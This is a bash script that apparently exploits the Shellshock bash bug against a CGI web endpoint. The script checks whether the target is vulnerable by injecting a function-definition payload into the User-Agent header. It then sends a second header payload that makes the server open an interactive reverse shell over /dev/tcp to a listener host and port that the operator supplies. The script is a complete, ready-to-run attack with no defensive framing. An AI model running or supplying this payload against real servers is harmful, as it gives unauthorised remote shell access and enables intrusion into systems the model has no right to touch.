#!/bin/bash
url=""
lhost=""
lport=4444
while getopts u:h:p: opt; do
  case "$opt" in
    u) url=${OPTARG};;
    h) lhost=${OPTARG};;
    p) lport=${OPTARG};;
  esac
done
if [[ -z "$url" || -z "$lhost" ]]; then
  printf "Usage: bash %s -u <url> -h <lhost> -p <lport>\n" "$0"
  exit 0
fi
printf "[?] Testing if target is vulnerable\n"
if [[ -z $(curl -A "() { :;}; ''" -s "$url") ]]; then
  printf "[!]Not vulnerable\n[-]Exiting...\n"
  exit 0
fi
printf "[+] Target vulnerable\n"
if ! netstat -lt | grep -q "$lport"; then
  printf "[!] You're not listening on port %s\n[+] Set it up and press enter" "$LPORT"
  read -r
fi
printf "[!] Sending reverse shell to %s port %s\n" "$lhost" "$lport"
curl -A "() { :;}; /bin/bash -i >& /dev/tcp/$lhost/$lport 0>&1 &" -s --output /dev/null "$url"
